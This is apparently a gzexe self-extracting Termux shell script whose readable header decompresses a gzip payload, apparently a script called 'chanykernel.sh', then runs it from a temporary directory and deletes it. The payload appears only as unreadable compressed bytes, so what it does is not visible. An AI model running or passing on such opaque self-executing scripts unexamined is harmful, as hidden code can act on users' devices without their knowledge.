#!/data/data/com.termux/files/usr/bin/bash
skip=50
set -e

tab='	'
nl='
'
IFS=" $tab$nl"

umask=`umask`
umask 77

gztmpdir=
trap 'res=$?
  test -n "$gztmpdir" && rm -fr "$gztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

case $TMPDIR in
  / | /*/) ;;
  /*) TMPDIR=$TMPDIR/;;
  *) TMPDIR=/data/data/com.termux/files/usr/tmp/;;
esac
if type mktemp >/dev/null 2>&1; then
  gztmpdir=`mktemp -d "${TMPDIR}gztmpXXXXXXXXX"`
else
  gztmpdir=${TMPDIR}gztmp$$; mkdir $gztmpdir
fi || { (exit 127); exit 127; }

gztmp=$gztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$gztmp" && rm -r "$gztmp";;
*/*) gztmp=$gztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `printf 'X\n' | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
  umask $umask
  chmod 700 "$gztmp"
  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
  "$gztmp" ${1+"$@"}; res=$?
else
  printf >&2 '%s\n' "Cannot decompress $0"
  (exit 127); res=127
fi; exit $res
��Qchanykernel.sh �T[kG~�_qb��.�~��X�H�����uYfwGډfw�;�������/vIC���Sh�C}k�C�Z�`���nd�6I�9�|�6�̜��y�y�q�aZ�M�ڄ���W�w�D�0�n�k#�m<���8����\b9ӵ&NhJ�F_�	���O?����G'��4	��~�T�������_h~��
���܃�֏�2\��Uc���ch�}"�-*7/�zH��TF21����22eba��V��S��!�<f���J6�-������<d�@(��W�C.�W���W��J3\������?lg2q�<>-����gU=�3`j`�9=��x�ȇ_�:T4�L)���7�I����j��2a�	VQ(�ď�����02�����]�z��c��z�ET伖��Y�8�-馑\���h!Y�t+��d�а���)H��e�,�R	2RK��8��Y�@<�*g��/A��ƤzU�VW#��N��V�
�E�G(��Ҵ�q�s���1H�;�Q�|�T�+��V*������Nc���1�VU�Ӕ��� m/�]��Ɛ��+�����QM�zy�,��r,���G�rL�o�<W�r|.ߔ����7�)�-�/�
�Iz=���?��J!�����?��җvE�s���f.�0��7n܀���ʟȳ�˗�h�@8l���1C�Q]�:�k���j�hgw��nm�;��]˥d���̱>�w[������t�ԬU�Rw�)��ϰ��#N���r]l��Zͽ�E��U���x�Cm��v7X��V5���j�㽝F���.Y��1��;��K�,̼�9m����_��t��^��Y(�͜��jnRۥw���^g����>	/_W�cr��ts(��@F-����h��.|
�`.+gF6%Y��$k��j�e�G�����4�bq��g����'�>M9��8�����s��C2���g��E&]���7��đ������gO�c�p������GÀ<c2{���ҤK&SX�P��� �ӻDx  